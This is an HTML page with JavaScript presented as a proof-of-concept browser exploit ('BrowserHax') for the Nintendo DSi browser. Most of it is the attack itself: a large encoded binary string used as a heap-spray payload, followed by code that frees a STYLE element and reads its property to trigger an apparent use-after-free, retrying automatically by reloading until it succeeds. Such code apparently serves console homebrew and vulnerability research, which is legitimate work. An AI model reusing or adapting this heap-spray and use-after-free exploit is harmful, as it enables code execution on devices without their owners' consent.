
<html>
<head>
<meta http-equiv="refresh">
</head>
<body>

<h3>Nintendo DSi BrowserHax PoC</h3>
<hr>

<blink>Exploit in progress...</blink>
<div id="sandbox"></div>

<script>

var cur_obj;			// Reference to currently tested object
var out_div;			// Top-level sandbox in which cur_obj is created
var cur_tag;			// Name of cur_obj tag

var spray_str;

/* Try to spray the memory with known strings to make fun crashes more visible */
function heap_spray() {

  if (!spray_str) {
    var spray_str = "Â Ã£â‚¬Ã¥8Å¸Ã¥Ã®  Â Ã£Ã®Ã®Å¡Ã®$Å¸Ã¥$ Å¸Ã¥ 0Â Ã£ QÃ¡  
0ÂÃ¤ QÃ¡Ã¼Ã¿Ã¿[  ÃºÃ¾Ã¿Ã¿Ãªx   D Ã¤ Ã°Âµ $â‚¬'" &
M +Ë†9Ã’ , Ã+â‚¬ Ã°Â½+Ã‘h;`x;C R 4@"C[4 Ã¨Ã§Ã€FD Ã·Âµ $ % 8ÂBNx3â‚¬#B Ã‘$Â³j Ã”R!Â¨Ã¿Ã·ÃŠÃ¿3 j3Ã¨T#Æ’@Ã¤$5$4-Ã©Ã‘!Â¨Ã¿Ã·Â»Ã¿- $-Ã‘, Ã 4$$!Â¨Ã¿Ã·Â­Ã¿ (Ã¶Ã,SÃ,Ã‘!Â¨Ã¿Ã·Â£Ã¿% # : : -CÃâ„¢9â€˜	x;pÃ³Ã‘<$$Ã¤C?ÃÃ§b Â³Ã“ZÂ¨ â€œ3 j3]Ã¿Ã·Æ’Ã¿ â€º$$,Ã,Ã!Â¨Ã¿Ã·wÃ¿0Ã !Â¨Ã¿Ã·qÃ¿00  B Â³Ã“Z â€œ3 j3\Â¨Ã¿Ã·dÃ¿ â€º â€œÂ¼Ã§!Â¨Ã¿Ã·ZÃ¿ 0Ã§Ã§ â„¢Q\Â¼Ã§8 Ã¾Â½Ã€FD Ã·Âµ #&JJJIKM 8```Ââ‚¬â‚¬0 PCFLFOÃ€Ã„â€BÃ¼Ã‘21ÂªBÃ©Ã‘BJCI`CJ`CJpCJpCJâ‚¬!BJpBJCIâ‚¬CJCI`"CKRB`BK
Ë†BÃ¼Ã‘AKBJiF`#AHAJâ‚¬SË†1â‚¬@K Ë†
Ë†Â®BÃ»ÃË†3â‚¬#â‚¬SË†â‚¬ Ë†Ë†ËœBÃ»ÃË†!3â‚¬4J Ë†@+Ã»Ã‘2N3M3+p1 2HÃ¿Ã·Ã¿1K1ÃŠ@VC ) Ã‘â€š#+pÅ½#-Jâ€º`Ã€",KÃ’`â€"!Ë†*Kâ€™@
C"â‚¬"!Ë†BÃ¼Ã‘"Ë†@â‚¬#â€ºC#â‚¬$J$K`$J`ËœGË†93â‚¬Ã–Ã§Ã€F Â¸   Ã¶9 Ã¨: Ã¨@ â€šÃ¿Ã¿D H I  G  â‚¬Ã¨Ã¿Ã¿ â€  @  Ë†   (Ã¼Ã¿$Ã¼Ã¿&Ã¼Ã¿â‚¬    B @   â€Ã°Ã¥ 8Ã¿Ã°Ã¿Ã¿Ã°Å¸Ã¥Ã¾Ã¿$Ã¾Ã¿â‚¬ >ÃªOh|Å’ÂÃ–KÃ¨`
Å“Ã½8)Å WÂ³uË†Â¨Ãªâ‚¬QÃÃ°)Ã¡â€¡ÃÃŠÂÃ’xN[Â£ÃÃ¾;F&ÃºhÃ¯câ€¦Ã«ÃŸÂÂ³ÂNÂÃ ~Ã‘ÃŸÅ“2Ã•;QÃ¢Â§Ã¼Ã¸Ã€DÃµÃªâ€“F$Æ’Ã Ã´3!ÃÃÂ±NAvÂ¢Ã¨xÅ½SÃ¢Ã»â€ºÃ°Ã¿ÃŠÃ¾â€˜Â IÃ½Ã²ÃŠLâ€ Yâ€™â€°ÂªÃ¼9XÃ |lÂ¸R3$Â´uÂ²Â°Å½Ã„Ã‘HÂ¼Â¤Ã€uÂ¶Â´Å½ÃÃ‘HÃˆÂ¤ÃŒuÂºÂ¸Å½ÃœÃ‘HÃ”Â¤Ã˜rÃ­Â¾)Â¼0k5â€™N!ÃªGÃ¯-Å¸Â©â‚¬ÂÃ£@?Ãxâ€”ÂµÂÃœ1ÃŠÃº â€œÃˆÃ€ÂºYÃ–Ã‚Ã¼Â°9Â¥Â®Ã¸{XÂ´Â¿TÂ§)@Å AEC"Dâ€˜HEÂ¤FRH)IÂµ4O3,â€šÃ¢Â´Ã‚Ã¡Ã¥G1ÃƒkÃ½$Ã—Ã¬ ÃÃ»â€˜Ã²0>Ã“â€¹Ã¥Â¾.CVË†I8Xâ€šhÅ½Â¿
ÂµÃ¸lÃ¯Â 3Ã·LÂ¶PÂX"Æ’Â§Ã«ÃÃ§H7Â£AÃ¥} Ã“Â½RÂ£Ã‚â€šJÂ Ã§Â¶Â¯Ã’Ã¡Â¿oÂ¶
$ Å¸0Ã‹RÃ¶Ã¼?Å½Â¹Â·Ã½4Ã£Ã›1Â¯Ã¥Ã WÂ Ã¥ÃµÅ¸Ã¾Å½CÃ¼#unÃ¨!"Ã"2Â«Ãs#fÃ”ÃŒXÃ„Ã²7Å¡Ã±Ã†/Å Â¡Ã°WÃ—ÃƒtÂ¬Ã¾>0SÂ¶Ã¹Ã°â„¢[Å¸Ã¡Ã°Å“Å¸ÃfgKÃ–g MÂ«dÃÂ®g})5Ã­Âµ 
8Â»-{r9Ã¤Â±â€Ãâ€¡Å¾Â¥o(@ÃŸÂ¨%Å â€˜-Ã­â€˜ Å¾Â¹\â‚¬&.BÂ®Ã±Ë†Ã§<SÃ±Ã­Â§Ã§â€˜â€°Uâ€™Ã‚Ã§Ã±qÂºuÃ¨ÃœÃ:)1ÃºMÃ­JÃ­-qÂy4TgPCÃ–Ã‘Â¤Â¤Ã”H%	Ã¥ Ã¤Ã—Â®Â¹Ãª4â€C~UÃÃ¨ÃœÂ£Ã‡Ã•oNK6Ã¸Â¹W.Ã«â€ºÆ’Å¸CÅ“BÃ©Ã’rÂÃ¨qÃ¿8KÂ½Ã¥*hÃ‡Ã±â„¢6kÃ°R;(Â¢,â€˜H8Â¤<u}Ã®ÃŒQÃ»\pjgrÃ£a_sÃ¿/$Å¸â€'Jâ€¢7&tfÂ\Ã¢ÃœÃ¿Ã¯Ã†=Ã¸Ã‘Ãt 0Ã‰4â€œÂ´Ã°Â¿Ã¹3Ã½Â»#E%2Ã³[BÂ«Ã©"â€œU1qÃ½Â²â‚¬Ã§Â©Â¨WÃƒ$Ã„tFhÂ³â€Å“ÃÂÂ­â€¢p5!Â³Â¡kFÃ§ÃšÃq|*Â©01>5Ã„Â£Ã²$xÃœS@[Â½Ã‘7jÂ½ËœÃ–JÃ ssÃâ€šâ€°XÃ¥:0p"Ã§IÃ´Ã§Ã¿Ã‡(â€šÂ¸JÂ°EÂ´#Â¨Â¤EÂ´Ã„RÂ¼)Ã€E!-ÃÂ¢Ãˆâ€˜HÃŒÃª
)Â£Ãƒ6Â )JGÆ’â€šÃ‰â€œÃ±]Vâ‚¬Ã¼xÂ¬Â¸#Ã›SÂ®ÃŸÂ°<[PÂ½KÂ¨Ã£Ã²<NÅ¾ÂÅ¸
Ã¿
Å¡Ã»Ã…Ëœ<?S;â€º2E(Å½â€¹9Ã»â€ºlÂ¼Å¡Ã±Â½â€¹cDxâ€œÃ™Âª;!â€¢â€˜ÃJÃ˜Â³Ã¤*Ã¼Ã›Ã±XÃ˜+SmÃ¾â€ºÃ•Ã±Ã©Ã°[â€°.:HÃ±Ã¯Ã»RK,YlÅ“DÃŠ7URâ€¡Â³Â¶Ã¶9râ€˜tÂ±Ã»-â€¢Ã+Ã±:btrÂxÃº_Ã¤Ã w3EÃ”â€¦Ã˜#Ã¤<ÃœÃÅ½Ã¦\)â€<Ã¶ Ã ÃJÃŒEÃ˜"Ãœâ€˜HÃ€Â¤ÃˆÃ¡sÂ»"Ã‡W]Å¾Â§â€Ã€yd)Ã‘Ã•Ë†Â¿+Ã½$VÂ²`:OI<Â­?ccÃ¸<=Ã°c$Ã²Â·Ã´Ã„/[Ã»Ã½Æ’4IÃ¥Â±Ã™Â¼;Å¸1pÂµM"Â«%qÂ¬aâ€œÃšIJIÅ¡`Ã’5&â€“FC?ËœAÂºÃ›Ã¸Ã“Ã¦Ã‘sÂ®Ã@ JÂ³=â€œBÃ™oÃ‘ÃœÅ \Ã Ã¹yNÃ°HLÂ¹MÃ’y{jÃ§Ã Ãœâ‚¬IkJÃHÃÃ²Ã˜Ã½+bÃ¼ÃÂzÃ¾ÂºÃ¼Ã©Â§HÃ‡Ã¤Ã‚Ã½Ã¾,Y`Â¤Â¬MÃ·Å’pÃ¶ÃŠ5Ã§Ã’ ;Â£â€”â€¦"Æ’â€˜Â½Â´Ã‚GtÃ¼yÃ¬Ã¤zÃÃ¡$IÃµÂ¯Ã°Ë†Ip4lÅ“Ã¸Â¦Ãµ+ÂµcOJÃ˜ÃŸ!ÃÅ½Ã™ÃºÃwJÆ’Â»hâ€šÂ£Â¶XÃ‰9DÃ‡34â€¡Ã¡Ã€Ã³{x)9xÂ§Âµâ€™Å’ÃŠÂ¶QÂª9Ã¦+Ã‘%*Ã³b|Â®A.â€“
Ã¶>Â´â€¢Ã³ÃÃ¿ OOÃ­
{Ã¾Â¦Ã²Ã±5UTÂBÃ²Ã%fÃµ0Ã¦^Ã€Ã¿xÃ‡]Ã‚<Ã™Z	Ã€Ã¸ËœrÃ
Â¬sâ„¢Ã™HÃ€Â«ÃšÂ«Ã¿$pÂ¬dÅ¾Ã‡ÃËœËœBÃªÃ™
ÃŸHÃ¨Ã§	Ã¹â‚¬Ã™hR
â€ºÂeFâ€ºÃ¿#}Ã±KÂ¤Ã¬tY]	Â 37Ã˜Ã™Ã¬Ã»Ã»$Ã‡
p9WÃ¶ZÃ£*xna;Â³+Ã˜Ã¶ÃÃŒW#Ã°Âµ7Â´	Ã‰Â®#xâ„¢Ã¿Ã»Ã2ÃÃ¾VuKÆ’â€ºÃ¢MÃº}Ã¯ÃÃ³Ã§rLoâ€¦6<878ÃƒÃâ€¦R2FÅ’
lSÂ£(AÃ²ÃœÃ‘â€“*Â®N+.T+{Â¿â€¢6Ã¿![rÃ¢\Ã£â‚¬*RÃ¾Â¬]Ã¢Ã•ÃŒ&Å¸z?Ã¯8Â¹\7g_"Â¢Ã¦Â¸XÃ¡JÂ¥ZÃ£=Ã®Ã¡|~Â¥UÃ¶IiÃxfRÂ¾T~Ã·â€ Ââ„¢a\aÃÃ¢Ã˜ KÃ«ÃdlPH[Å¸Â¬Ã¥Ã¬Â£{-_Ã­Ã­Ã­hL;OÃ¡9Ã»gm#ËœÃ•Â¶Sai>vÂ bÃ…|ÃÂ³!Ã²	Ã€Â¶ÃÃ³*`@Â¹Ã
Å¡Ã¬HÃ¿DJEKÃ¿Âw"p>%CIÅ¾GÃ·ÂÂ¾!yYÃ§Ã§â€¹BÂ¦OÃ¡câ€¦Ã¨Ã“Ã™DÃ¨
cfÃ¿â€¹Ã’Ã¯/
Ã‘'3Ã£\Ã»â€ºÅ¾Ã>Ã•[ElÃŸÃ‹Ã»â€$Â²Ã¹Ã¯Ã¥}Â Â¡Ã¹câ€¹Ã‰ÃƒÃ¯:Ã­<0Ã½13ÃÃ‚
Å½Ã§Â Ã§câ€¹Ã€â€™9h>GÃÃ›>VCâ€ Ã©JÂOÃµâ„¢72â€™rÂ²â€“Â©Â¾)-2NÂ¬,Â²Å½P.ÃŠÃ»1/MhÂ¹MÃœ`Â§ÃÃ³4(3Å¸Â¨#xÂ»Ã‡#f<Â½ÃµÃ¹Â­"@Å¡ZCUÃ¿=`Ã§Ã¿Ã–Ã¡Ã™<#Ã¤H|8Ââ€šÃ (R@?Å“,Â¡Ã…$:Å“Ã´Ã¿
3ÂµQÅ½IÂÅ½jÂ'Ã»pÃ©gÂ¥p,â€”Ã’-Ã”Â¥k.+Ã¸Ã‘H?â€ºÃŒoÃ–>FÂº0g6Ã´JÃ¾ÃªÂ­![â„¢fJ.Â®Xdâ€ bËœ+Ã±>Â°â€¹7Â»Â;Ã‘,â€¹LÃ=â€¦PÃƒÃšKÃƒÂ·ÃahÃ¦â€¹1:N')â„¢Â³Ã˜Ã§q&â€ºÅ’Â½	\Ã‚dKÃ¤Ã¦ "â€º!Â¢Â¨Â³Ãª
Ã¾Ã#Ã z/@Ã…(cÃœuâ€\Å¡Wâ€¹+Ã†o}Å ÃšÂ¶'Ã‘O&vzÃÂªÂ³|Ã˜Âµ.Å’yÃ¾Ã·â€º]ÃŒeF}0.Ã°Ã½xNÅ¸xÂsRÂ°6ÃƒÃ‘Â¨Â¦Ã3â€°Ã¿-Â¿Ã‘OUÃ¹JÂµhâ€ºÃ˜9Ã‘Â¸l9â€™Â´Ã¯Â«Ã°\}Â³UÃ¾?M]â€º6ÃBXAwÃ€sxÃnÃ¯`b#}Ã˜3Ã£Â¢Ã…~Â¶Â²7Ã¾Ã CdÃ§8Â¯H4Â¤0|8&08,wÃ¬câ€¦9Â°Â
Ã¸Â©c9Ã­MÃsKâ„¢KÂÃ‘Ã AÃOÃ’Ã…)Ã¡Mo,Fâ€œÃœ9h0Ã¾[ÃÂ¨Lâ„¢
Ã™Âª5ÃŠâ„¢Ã¦Ã±â€“Æ’Ã¶
Ã±>Â½4â€™Ãâ€˜/Ã™â€œ>Ã»ÃŒ?ÃkÂlÃ›ÃCgÃˆÃ¶Ã@_Ãš^*
Ã“[Ã¯Ã°Â³ÂµÂ¸)Ã–â€ºÅ¾Ã½Ã’x;Å gÅ½Â¦PX{ÃƒWâ€œ;jÃ½!JO3Ã†â€“Ã»Å¡â€œB2Ã‘5Â©Å½ÃƒÂ½sÃ°PvÃ½Ãƒ<ÃÂ­Â°1Â±Â»ËœÂÃ¬2Ã…Ã§gOÃ¹Â£NÃœÃ®Ã´g7â€™$Ãƒ;htâ€šÅ¸=BÃÂ¥(Ã…â€ºNÃ½?Å¡o
K nÃ‘i9miÃ°Ã¸Å¸â€ºÃ¤Â¯Ã›Â¯ÃƒÃ¶Â³Â±Ã†Ã²\Ã­ÃŠÃ‘gÃ„Ã‡(%Ã‡Ã§ÃÃ©(Â â„¢D%Â²AÃÂÃ±Ã­OË†Ãš6xÆ’Ã”ÃªÂ­ÃÂ¶7I@OÅ’"â€”Ã•Æ’Ã‰YCÃ£ÃŠÃS]Ã§â€ Ã°Uâ€°Â¸JÃ§ÂÃ…ÃmÃœ!ÂµÃ²Ã“ÃŸÅ¸Â«â€¹Nk^iÅ“Ã¦Ã°Â­WÂÃ”Ã¿Ã£jÃJÃºÅ“Ã¡Ã˜Â¥	3CÃ“DÃ§Ã™hË†8Âº[Ã·Ã§Ã¹Ã‰Ã°ÂµÃƒÃ‹ÂÂ°Ã¾ÃœEyâ€º#â‚¬Ã—Ãˆ@â€œÃ€Ã¾kÃ†BÂ¾Ã‡Å“wÂ¯â€â€“â€¹tMzÂ¬/ Ã¥Ã¬Ã¤Ã²Ã®@UÃ¼Ã‘Ã‘qL#Ã¢Ã²jÅ¾Mu+joÃµÃ«Ã–InK	Â¿Ã§dCh_â€â€œ^Â´Ã¯Ã©ÂªÃ²Â©Ã³-Ã¤BZAâ€™_+ÃºÂ¾â€¢:~Â©Å OeÂ­Ââ€¢
Â®qÃ±%ÃÃv-NBÃ¦Â«6â€“0=,_z\^IÅ½B(Ã™Â¿ÃŸ1ÃÃ–â€“Ã·<XÂªÂ´Å¾ÃhÃƒÃÃ¶â€˜,*XÃ iÃULÂ¡Ã¦Å½Ã³dÃ¶Ë†MÃ¶1sÂ±BÃ¹Ã‘ÃºÃ’:Bâ„¢J1MÂ¼ÃŒk(KÂ²â€šÂº
Â©Ã‰yÃ™!BÃ“#Ã‘â„¢Ã¼) Â¼Å¸-ÃzË†EÂ»&90N~>IÃ­Ã™N$Ã´Â¨Â¯~Ãºâ€;NÃ‰4`	Ã¿Å“Å’Ã©Â£Ã£a9LÂ¤FÃËœ[sâ„¢aÃ‹DÃ“U8N1@Ãºâ‚¬Ãâ€˜37J;B/ÃÃ¾Â§â€šhsL`sNÃÆ’9FÃƒÃÂÂ¶<Ã¢fÃ¨;â‚¬â€ºÂ¾:Ã§Ã\Â¦.Å’Ã5Â²Å¡-3@-[)+Â£4Æ’
dÅ“*KÂ¸Â§g\<Ãƒa
Â°Ã°Ã¿Â¦
ÂªÆ’â€™Ã¦RÃŒÃ•UÃ§gâ„¢â€¹Å¡Ã¢Ë†Ã‹Bkâ€Â¹Â¬QÃ•Ã’â€h]KÂ`:
Ã‰Å B_Â«@Ã¦Â¸.Ã¶Ã£Ã‘Ã€Ã˜Ã¡HI"ÂÃ
D[@qÃ‹0Â±Ã½Ã¾Â©vÃ½;â‚¬Æ’Ã©Â²â€˜HÂ¤R)Å GVÃ‡câ€¢GyÃ¬	Â³Â¶"%ÃHÆ’.+K,7Å“BÆ’Ã‚â€š.Qbc(L'â€”@â€œÃ¤'ÃµÂª!zÅ½&IÅ“lÂ¬Ãš%Â¡6F,Ã¦Ã1â€Ãˆ$ÃœÂ¯Â£oBÃ• Â¹KÃÃœÃ¢#fâ€™â€Ã¡Å¾1Âª*Â¥â€š(KSÅ¡JÃ•Â£e:5Ã›#NOÃ‹Â®Ã5cg.c3c&+~Â¿Â²ÂµÃ­Ã­H,Ã•ML%Ã•Ë†Â´Câ€”Â¤rKmÃ²Â¹*QÃ¾t6Â¼ymÂ­[Â¢	Â"tÅ¾5zÃ˜ÂBIkÃ â€¦ #Ã¤~"Oâ€˜Æ’ÃªÃ¼â€Ã¾Å E$#Ã¤Ã®@a(%H&Â¤xÂ®pÂµ[LCÃ¢Æ’#Ã®Ã°Â¹Ã¹?Â³8Â£Ã•"â€ºUÃâ€œÂ²Ã´22Â1â‚¬ÃŠÃ›@Ã½Ã¦PqX'Ã‘JOI*CÃ†!Â¦Ã›Ã°Ã•?Ãƒ*Ã­ÃšÃ«â€ºÃ¥H+ÃÂ½Ã¤UÂªAÃŸqÂbFÅ½"
CÂ¢Ã»*ÃºW@gphAÆ’ÂºÃ´Ã¾>Â¦Ã³i"b=IÃ¿â€šPÃ¶`Ëœ@Ã¨Ã‘Â¢â€™	:Â¤*RÃ&Ã¸%0Ã¯Â°cÂ¦_Â§Ã’3Â¦tÃ¡Ã¤Ã“)Ã¨Ã€Ã˜ÃÃŠAÂÃ¹Å¡vÃ¦Â©bÃŠÃâ„¢ÃˆÃ3#j(Â¿Ã¯Ã†Ã†ÃƒÂ£Â»+BÂ»Â¸Ã®â‚¬&Â¶Ã±bÃ˜IÃ¤Â¼Â³Ã‹(cÂ®Ã‘;jÂ½ÃÂ¦bÃ°2Ã‡!Ã³"~Ã Ã£3$Â Ãâ€™Å¾â€ºÂ¹Â¿Â¦ÃªÂ³â„¢*&}Ã‰	Ã¹C2Â¼t!Ã¬b~â„¢Qâ€œc[
Â¬?#Ã¢ÃŸ*@Â£Â»#c}WÂºCfâ€ºÃ³Ã³Ã®xÃ©P$7vÆ’Â§-iYlâ€œÃ¤u	MF%#Â²G*Ã¸ÂµLÃcjÃ±nâ€°Â£"<Ã‘FWÃâ€ºHÃ½Ã“"â€¹â€ 
KÃ³RÂ¨Â³+Â®Ã‰Kâ€°Ã•Â¼rJmÂ¯â‚¬ Ã±2M.I'qe`Ã¿Ã·TÃ½Â h@Ã€Ã¸Ã¾ÃŠtÃ¨Ã£-E!I*
HOÃ™<Å¡E}3Å¾Ã¦Mâ€¡Â­ AH0Â¤@RP)`&p):â€¦Ã¹?HÃ¢Ã¾1Ëœâ€°Ã»q0â€n,Â©Ã‹Ã¶ÂÃ…Ã¥/wwÃ´Â«â€¢Â»Å Ã†ÂºÃ£â€.Sâ„¢I}Ã“Â¨.	hXÃ®Ã¼hQÂºWlÃ¾Â¹â€˜@Ãƒfk
Â´XÃ­Â¼aÃ€ÂÃ¢Ã¿Å“Ã¨Ã¿Ã’0GÃ…<P/Â´p?Å¸O/t_Roi4ÂÅ¡Å¸OhÂ¯	ÃºÃƒÂ°Â¤rkÃ®/ Â¤LÃ˜Ã‘	Â³â€º-`ÃgÂÃ¹LÃ¥â€¹Â´-Ã€rÃ“Ã« Ã’ÃªÃ¬Ã›Ã¢ÃŸÃ°!?ÃµÃâ€¢ÃšÅ½kXÂ¦FÃ¡Ã¢;Ã®Ã¥Ã™ Ã“3BÃ“. Â¹Å Ã¢Âµ&Â{tXÃˆ4MÃ¾;Ã°Ã“ÃByH\Â¨Å â€¹L3sI+Â¤5Ã­IÃª=BÃ°Â
ZhTÂ¡ÃŸÃ…ÃœÃ¿LDII8 Â«Â´Ã³pÃ­aÂÃƒÃ•Ë†Ã›Å¾:N3"#ÃÃ€	d9ÃÃ Æ’Â2Ã°h \Æ’0Æ’ÂÆ’ÂAÃ­GPâ€œÃ´ DlS-AZÂÃšâ€â„¢Ã¡Â»v@ Â£xâ€šÂ¡Â¿Ëœ#2|Ã–cH~ËœÃ¬| 0Å½1> Ã â€ ?'Ã¸Ã‰Ã€Â¼Ã²l ppCÃ­Ã€ZÃ Â¨a9Ã­Â½QÃ¢'?Ã¨Â°IÃ¨0Â®1Ëœ&|Å¡ÂÅ’Ã¡(Ã«P
ÃÂ²]ÂÂ¼Å’XÂ6YÃ“Ã’mÃ˜R"uÃÆ’ÃµÅ¸Â¬pÂ³Â-â€š'Y1ÃºÅ¾F:sËœÃ£Ã¥Â¨=Â¨Ãª2Ã«Ã´0FÃ†â€“Â¡Â­FÃ­F]fÃ¡Â¡1C Â¢â‚¬Ã¿
ÃŠS{"Â°Ã¥ÃŒÃ¯Ã‡Â¼Ãs
 <gâ€˜â„¢ÃŒÂ§Ã˜.â€”â‚¬{L;>Ãš<Â¦Ã¤#â€˜Ã™Âº3ÃºÅ½)Ã”u	!rÃ²"zLRÂ¡% â€šÂÃ¾\O3Ã«Ã­`Â¡BÃ¹0Ã bFÃ¡iP)Ã¬Ã Ãƒâ€œÂ Â³2Ã¾'mQÃ£Ã·ÂÃ¤
Ã–â€“Ã©Â±fâ€™Ã«@Â½ÃÃ¨â€™Ã£LÂ¿AÃ ~ÂpÅ½Â«Ã°Âµ*9Ã™
Ã²CÃ±jÂ­7Ã‘ Ã¿=-	.Â¯Â¥6Â'Ã¥gÃ‹_â€”Â§.Å¸\Ã§hÃŸ`Â¾34Â³/BÃŒ$f5-â€”IÃ¥@EÃµ,Ã™Â¼tÃXÃ®PÃ¸3Ã¦Ã›l.Ã¹Ã˜Â¿<wâ€”4Â¤v@-Ã—	â€¹Ãµ7ÃW#ÃŒ\Ã¬T3â€œBÃºÃ¹Â»EÂ¼Ã¿y*Ã³Ã‘Ã¾NÃ°\" Ã¸Ã§Â¿ÃˆWÂ=Ã¹zÆ’ÃŒÂ¡Ã¾Ã®â€šÅ¸Ã¥ÃŸ/Ã¡7ÃxGÃ€FÂ{Ã²ÃªÂâ‚¬BÃOT.NDSÂ¿Â¨Ã¿Ã˜' Ã³$GÂ¹Å¡â€¹3 
eÂ¹ËœÂ±" )"  Ã”  ";
	/* TODO: TWEAK for DSi */
    for (var i=0;i<12;i++) spray_str += spray_str; 
  }

  window.name = Math.random() + spray_str + Math.random();
  eval("window.name=''");

}

//Important for exploit stability, 10-100ms are okay
function sleep() {
  setTimeout(function () {
     return;
  }, 100);
}

/* Log an event. */
function log(message) {

  //console.log(message);
  sleep();
  return;
	
  /*
  var stateTemp = "NaN";
  var request = new XMLHttpRequest();
  request.open("GET", "debug.php?state=" + stateTemp + "&message=" + message, false);
  request.send();
  */
}

/* Main browserhax function */
function dsihax() {

/*********************************************/
/* PHASE 0: Create new HTML tag in a sandbox */
/*********************************************/

	log('+++ Phase 0: initialization +++');

	try { 
		out_div.removeChild(cur_obj); 
		log('Previous object removed OK.');
	} catch (e) {
		log('Failed to remove previously used object.');
	}

	cur_tag = "STYLE";
	log('Picked target tag: <' + cur_tag + '>');

	cur_obj = document.createElement(cur_tag);
	out_div.appendChild(cur_obj);

	cur_obj.innerHTML = 'Hello world'; 
	log('Populated object with sample HTML.');
	cur_obj.value = 'Hello world'; 
	log('Populated object with sample value.');
	  
	log('+++ Phase 1: discarding object +++');

      heap_spray();

          log('Trying to delete child node via DOM...');
          try {
            out_div.removeChild(cur_obj);
            log('...success.');
          } catch (e) {
            log('...received exception (' + e + ')');
          }

      heap_spray();
	  
      if (cur_obj) {
        log('+++ Phase 2: read objects "disabled" property value +++');
		log('+++ This should crash the DSi. Retry when not... +++');

		// read object disabled property, will crash the DSi, because use-after-free?
		// sometimes returns randomly true/false or just crashes
		var checkProp = cur_obj.disabled;
		log('+++ property value is: ' + checkProp + ' +++');
      }

}

  heap_spray();

  out_div  = document.getElementById('sandbox');
  out_div.innerHTML = '';

  //Silent Retry until it works...
  setInterval('try { dsihax() } catch (e) { location.reload(); }',1);

</script>

